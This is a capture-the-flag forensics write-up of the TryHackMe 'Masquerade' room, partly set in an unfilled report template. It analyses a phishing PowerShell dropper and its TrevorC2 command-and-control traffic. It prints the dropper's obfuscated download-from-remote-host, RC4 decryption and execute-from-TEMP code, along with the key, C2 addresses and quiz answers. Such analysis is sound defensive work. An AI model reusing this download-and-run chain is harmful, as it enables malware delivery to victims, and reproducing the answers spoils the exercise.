# Cyber Exercise Writeup: Masquerade | https://tryhackme.com/room/masquerade

## BLUF

**Bottom Line Up Front:**  
<Provide a 2–4 sentence executive summary of what happened, why it mattered, and the final outcome.>

Example:

> The exercise demonstrated how exposed credentials and weak service configuration can enable initial access, lateral movement, and privilege escalation. Enumeration identified an externally accessible web service, which led to credential discovery and unauthorized system access. The attack path highlights the need for stronger access controls, credential hygiene, and continuous monitoring aligned with DoD cyber defense priorities.

---

## Executive Summary

**Exercise Name:** Masquerade  
**Platform / Environment:** TryHackMe  
**Exercise Type:** Malware Analysis / Forensics  
**Primary Domain:** Network DefenseEndpoint Analysis / Threat Hunting / Incident Response / Forensics  
**Difficulty:** Medium  
**Date Completed:** <YYYY-MM-DD>  
**Author:** Justin Applebury  
**Classification / Handling:** Unclassified / Training Only  

### Mission Relevance

Explain how this exercise relates to federal, military, or intelligence community cyber operations.

Example:

> This exercise reinforces skills relevant to defensive cyberspace operations, including service enumeration, threat detection, vulnerability validation, incident response triage, and adversary behavior analysis.

---

# 1. Scope and Objectives

## Scope

**Target System / Network:** Event Log, Packet Capture  
**Rules of Engagement:** Malware analysis in an isolated environment  
**Assumptions:** Jim from Finance ran a script "apply critical security updates" from a phishing email. Unusual network traffic was observed.  
**Limitations:** Analyze Event Log and Packet Capture and analyze malicious code in packets, but do not run any code outside the isolated environment.  

## Objectives

- Investigate what happened
- Determine the impact
- Identify how the attacker established control over the system
- What external domain was contacted during script execution?
- What encryption algorithm was used by the script?
- What key was used to decrypt the second-stage payload?
- What was the timestamp of the server response containing the payload?
- What is the SHA-256 hash of the extracted and decrypted payload?
- What remote URL did the client use to communicate with the victim machine?
- Which encryption key and algorithm does the client use?
- After determining the client's encryption, decrypt the commands the attacker executed on the victim and submit the flag.

---

# 2. Environment Details

| Field | Details |
|---|---|
| Target IP / Hostname | `<target>` |
| Attacker / Analyst System | `<Kali / Ubuntu / Windows / REMnux / Security Onion>` |
| Operating System Identified | `<Linux / Windows / Unknown>` |
| Network Segment | `<Lab VPN / Local Range / Cloud Range>` |
| Tools Used | `<Nmap, Burp, Wireshark, Splunk, Velociraptor, etc.>` |
| Access Level at Start | `<Unauthenticated / User / Analyst / Admin>` |
| Final Access Level | `<User / Root / Administrator / Domain Admin / N/A>` |

---

# 3. BLUF Technical Findings

| Finding | Severity | Operational Impact | Evidence |
|---|---:|---|---|
| `<Finding 1>` | `<Low/Med/High/Critical>` | `<Mission or system impact>` | `<Command/output/log/source>` |
| `<Finding 2>` | `<Low/Med/High/Critical>` | `<Mission or system impact>` | `<Command/output/log/source>` |
| `<Finding 3>` | `<Low/Med/High/Critical>` | `<Mission or system impact>` | `<Command/output/log/source>` |

---

# 4. Methodology

## Approach
## Event Log

First lets examine the Event Log  
  
><img width="958" height="281" alt="image" src="https://github.com/user-attachments/assets/7b2c0654-a978-4a8b-ae65-90cdd5ad6e49" />
  
Here we see that in the course of 21 seconds PowerShell was launched and ran several commands, likely due to an automated PowerShell script.  
  
Let's investigate the logs:  
The first three Information Level alerts just tells us that PowerShell was started with information on the affected User and Computer:  
>User: S-1-5-21-753961636-1548247123-2641200033-1001  
>Computer: DESKTOP-I6C5C7M
  
The first Verbose alert is a simple script block creating a prompt to accept input into PowerShell. The ScriptBlockID is just a unique Identifier for this particular ScriptBlock and doesn't contain any important information by itself.  
  
The second Verbose alert is where things get interesting. The ScriptBlockText is **.\updates.ps1** which is a command to run updates.ps1 script that is in the current working directory. We will note this filename and look for it in later logs and the Network Packet Capture.  
  
The third Verbose alert shows us the details of the script that is being run:  
><img width="1125" height="176" alt="image" src="https://github.com/user-attachments/assets/7cfdc375-4365-4bd1-85ea-ec0daa720c79" />  
This script is being obfuscated to attempt to avoid Intrusion Detection Systems(IDS) and to make the Forensic Analyst's job harder.
>$k = [System.Text.Encoding]::UTF8.GetBytes(('X9vT3pL'+'2QwE'+'8xR6'+'ZkYhC4'+'s'))
  
This piece of script is defining variable $k and using this UTF8 encoding function to concatinate these individual strings in an attempt to hide the true value of the key which is <details><summary>Question 3 SPOILER</summary>**X9vT3pL2QwE8xR6ZkYhC4s**</details> and we will take note of this because we will likely use this key to decrypt payloads in our packet capture.  
>$h = (New-Object System.Net.WebClient).DownloadString((-join('ht','tp','://','api-edg','e','cl','oud.xy','z/amd.bi','n'))) -replace ('\'+'s'),''

This piece of code is defining variable **$h** and again by using functions that manipulate strings to obfuscate the true value being assigned to this variable.  
  
A quick rundown is that **join()** will concatinate the individual strings, and **replace()** will delete any whitespace because **\s** is the RegEx for whitespace and it's replacing those with '' which is a blank string.  

This is downloading the payload from <details><summary>Question 1 SPOILER</summary>**hxxp://api-edgecloud[.]xyz/amd[.]bin**  (NOTE: This is a defanged URL in order to protect people reading this report from inadvertantly going to the infected URL)</details>
  
>$b = for($x=0; $x -lt $h.Length; $x+=2) { [Convert]::ToByte($h.Substring($x, 2), 16) }
  
I'm going to reformat this portion of code to make it more readable.  

>````
>     $b = for($x=0; $x -lt $h.Length; $x+=2)
>    {
>        [Convert]::ToByte($h.Substring($x, 2), 16)
>    }
>````

This is a simple code block that is converting every two hex characters into a byte.  
A quick breakdown is that $x is initialized at 0 and as long as $x is less than (the -lt) the length of variable $h it will execute the code inside the {} and then add 2 to $x.  
The code inside the loop statement is extracting the portion of $h from $x to $x+2 base 16 into a byte and adds it to the array $b.  
  
>$s = 0..255 $j = 0 for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp } $i = $j = 0 $d = foreach ($byte in $b) { $i = ($i + 1) % 256 $j = ($j + $s[$i]) % 256 $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp $byte -bxor $s[($s[$i] + $s[$j]) % 256] }
  
Let's reformat this into something more readable than a long string of characters.  

>````
>    $s = 0..255
>    $j = 0
>    for ($i = 0; $i -lt 256; $i++) {
>        $j = ($j + $s[$i] + $k[$i % $k.Count]) % 256
>        $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
>    }
>    $i = $j = 0
>    $d = foreach ($byte in $b) {
>        $i = ($i + 1) % 256
>        $j = ($j + $s[$i]) % 256
>        $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp
>        $byte -bxor $s[($s[$i] + $s[$j]) % 256]
>    }
>````
  This is taking the key we found earlier and convert it into a pseudo-randomized 256-byte vector that is used to encrypt and decrypt a payload. This is known as the <details><summary>Question 2 SPOILER</summary>RC4 Key-Scheduling Algorithm (KSA)</details>  
  We will take note of this because we will likely use this in Cyberchef later to help us decrypt payloads we find in the packet capture.

>````
>    $p = $env:TEMP + '\amdfendrsr.exe'
>    [System.IO.File]::WriteAllBytes($p, $d)
>    Start-Process $p
>````

Finally this takes the decrypted payload and saves it to the TEMP directory as amdfendrsr.exe and executes it.  


## Packet Capture

The Packet Capture that we have has 4342 packets in total, far too many to look at one at a time, so we will use Wireshark to help us filter down and find the important packets.  
We have a few different ways to filter and search, we can look at the same timeframe as the Windows Log, or look for the filename amdfendrsr.exe, me personally I'm going to filter out DNS packets and look for the malicious URL.  

<img width="1261" height="293" alt="image" src="https://github.com/user-attachments/assets/bb345bdb-8e75-4d9e-a0f4-1d5507e28851" />  

Here we find the DNS query and response for the malicious URL. And the resolved IP address **34[.]174[.]85[.]91**  
Now lets filter out all packets that are coming to and and from the malicious IP address above. We see there is a single TCP connection and if we follow the TCP stream we are given this:  
<img width="860" height="818" alt="image" src="https://github.com/user-attachments/assets/d0a19d02-7ef8-4641-8322-970e520b8fdd" />  

Let's put this into CyberChef and see if our analysis of the Event Log is correct about the secret key and decrypting the payload:  
<img width="1913" height="826" alt="image" src="https://github.com/user-attachments/assets/468e493e-0dfd-4057-b528-88fad95e1721" />  
Let's go ahead and find the SHA-256 Hash of this payload, this can be used to update our IDS and to verify the payload in other possibly infected systems.  
<img width="1093" height="527" alt="image" src="https://github.com/user-attachments/assets/406a675d-3bc6-4c54-aa59-df1b1c9e3430" />



This confirms that this is an executable, however it's compiled and not raw code, so lets see if any of the strings stand out from the rest.
<img width="283" height="259" alt="image" src="https://github.com/user-attachments/assets/a8fd034e-4837-4c04-9cc1-f9545cbbaa1d" />  
This definitely stands out from the rest, we will take note of this and see if anything comes up in further Packet Capture analysis relating to "Trevor" and/or C2 (command and control).  
<img width="942" height="176" alt="image" src="https://github.com/user-attachments/assets/01f6bdcc-35b7-49f5-9a26-f6c2658c847a" />  
<img width="944" height="76" alt="image" src="https://github.com/user-attachments/assets/586b66f9-82e0-4bd6-9bd7-58df0b48ef1d" />  
This is hiding from strings analysis by having everything seperated by NULL characters. Lets go ahead and extract all these individual characters into something more readable.  
<img width="640" height="208" alt="image" src="https://github.com/user-attachments/assets/ee04a2af-1858-470d-b62b-c3f17e0b2923" />  
From this we can see what is likely the IP address of the C2Server and what is likely the secret key used to encrypt/decrypt communication between the client and server.  
Also we can see that they are using legacy browser headers to hide the traffic and ultimately the last bit is telling us that this C2 is designed to run commands directly to cmd.exe and it's using /Q Quiet Mode, /c is running commands that are in {0} and it's directing stderr to stdout.

Before we continue, lets do a little OSINT research into TrevorC2, after a quick google search this appears to be a C2 written by trustedsec/Dave Kennedy @HackingDave. The important piece is that the encrypted payload is Base64 encoded and AES encrypted using a key, likely the one we saw above.

Next let's see what network traffic happens immediately after this payload is downloaded. I do this by looking at tcp.stream eq 43
<img width="820" height="280" alt="image" src="https://github.com/user-attachments/assets/ba9816cc-3dba-4433-8bd0-10cddfe7d844" />  
This appears to be a beacon call to a Command and Control (C2) server as this is not a normal GUID. The Etag happens to be the SHA-1 hash of an empty string, and the "Content-Length:0" says the server responded with essentially nothing. This is indicative of a server acknowledging the C2 beacon call. Finally the sessionid appears to be a randomly generated identifier so that the C2 can identify any future traffic from the compromised endpoint.  

Let's continue with the next stream: tcp.stream eq 44
<img width="848" height="713" alt="image" src="https://github.com/user-attachments/assets/7dfe2540-617c-4a14-a649-73d09a319144" />  
The important thing to note with this stream is the headers, they are using the same sessionid from earlier and the infected system is still connecting to the malicious server <details><summary>Question 6 SPOILER</summary>34[.]174[.]57[.]99</details>.  
The Etag happens to be the SHA-1 hash of the html body.  
And looking at the html body it appears to be an exact copy of the Google homepage, however it's not coming from google, it's coming from the C2 server.  
This appears to repeat on 15 second intervals which appears to indicate a beacon single to ensure that the C2Client is still connected and waiting for a command. 
After a few of these beacon calls we get an interesting GET request for an image with an unusually large GUID:  
<img width="844" height="724" alt="image" src="https://github.com/user-attachments/assets/0acce5b1-d141-4757-8302-d20ad1d51597" />  
The GUID is encoded in Base64 twice and given the OSINT we did earlier we know this is encrypted with AES.  
Now the key we found earlier when inspecting the executable is 34 bytes long, but a common method of converting any pass key into a 32 byte key is to take the SHA-256 of the key.  
The other portion we need to decrypt AES is the IV, and I'll assume the first 32 bytes of the payload is the IV. Let's run this through CyberChef  
<img width="1164" height="890" alt="image" src="https://github.com/user-attachments/assets/81ecf186-afda-4829-b696-a4e924acda0f" />  
Aha! We see here that this C2 just extracted information from the desktop. Now lets run all the different TCP streams that have the same "guid=" GET command.  
<img width="1303" height="197" alt="image" src="https://github.com/user-attachments/assets/7fa45e43-4907-47bf-a9bc-74a5c6de0e80" />  
Here are the results of filtering for these criteria. Lets go ahead and decrypt them all.  
The first one just defines the &magic_hostname=DESKTOP-I6C5C7M  
The second one is above, and the third one shows us the result of ipconfig /all  
The last one gives us the flag we need for the final question in the CTF challenge.
<img width="1169" height="657" alt="image" src="https://github.com/user-attachments/assets/eef55fb0-395b-438f-8749-5549e954b497" />











## Phases

1. Reconnaissance
2. Enumeration
3. Vulnerability identification
4. Exploitation or investigation
5. Post-exploitation or evidence review
6. Privilege escalation or impact analysis
7. Defensive recommendations
8. Reporting

---

# 5. Reconnaissance and Enumeration

## Network Discovery

Command:

```bash
<command here>
